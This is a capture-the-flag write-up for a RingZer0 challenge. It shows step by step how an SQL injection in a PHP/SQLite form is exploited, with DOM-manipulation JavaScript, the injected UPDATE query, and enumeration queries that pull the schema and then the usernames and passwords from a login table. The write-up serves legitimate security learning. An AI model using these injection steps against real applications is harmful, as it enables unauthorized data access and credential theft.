# Knight Portal (3/3)

## Solution

From [challenge 351](./351.md) we obtained the source code of `home.php`. From there we try to find a way to do an injection in SQL.

Reading the code, we can see that:
- `first_name` allows for single quote, while all the other fields are more or less protected.
- there is a way to display error messages by adding a `DEBUG` parameter when performing a GET request on the page

We therefore load the page with the following url http://challenges.ringzer0team.com:10352/home?debug=true

Then we try to add a single quote on the first field and get the following error:

> Exception: near "Spearalot": syntax error in /var/www/html/home.php:41 Stack trace: #0 /var/www/html/home.php(41): SQLite3->exec() #1 /var/www/html/index.php(43): include('/var/www/html/h...') #2 {main}

Studying the way the query is built, and leveraging the fact that we can escape single-quote using double single-quote, we set up the fields as follow:
- first_name: "WOW'"
- last_name: ""
- salary: 50
- cameras: [""]
- notes: ", notes=(/** INSERT A QUERY TO EXECUTE HERE */) WHERE id=1 --";

We do this by manipulating the DOM:
```js
document.getElementById('first_name').value = "WOW'";
document.getElementById('last_name').value = "";
camera = document.getElementById('camera');
camera.removeChild(camera.lastElementChild);
camera.removeChild(camera.lastElementChild);
camera.lastElementChild.value = "";
document.getElementById('notes').value = ", notes=(/** INSERT A QUERY TO EXECUTE HERE */) WHERE id=1 --";
```

Which generate the following query:

```sql
UPDATE 
  knight 
SET 
  first_name = 'WOW'', last_name = '', salary = 50, cameras = '', notes = ', 
  notes =(
    /** INSERT A QUERY TO EXECUTE HERE */
    ) 
WHERE 
  id = 1 --' WHERE id=1
```

With this method, we can inject any query (without single quote) and prints its result into `notes`.

We start by listing all the columns of the `knight` table, including hidden one:
- Query: `SELECT group_concat(name) FROM pragma_table_xinfo("knight")`
- Result: `id,first_name,last_name,salary,cameras,notes`

We then list all the ids of the `knight` table:
- Query: `SELECT group_concat(id) FROM knight`
- Result: `1`

There is no other columns or rows that could hide the flag. We list all the primary tables:
- Query: `SELECT group_concat(name) FROM sqlite_master`
- Result: `login,sqlite_autoindex_login_1,knight`

We then list the columns of the `login` table, including hidden one:
- Query: `SELECT group_concat(name) FROM pragma_table_xinfo("login")`
- Result: `id,username,passwd`

We then list all the username of the `login` table:
- Query: `SELECT group_concat(username) FROM login`
- Result: `Baron Gevodan Salisbury`

We then list all the passwd of the `login` table:
- Query: `SELECT group_concat(passwd) FROM login`
- Result: `I'm rich and I know it.`
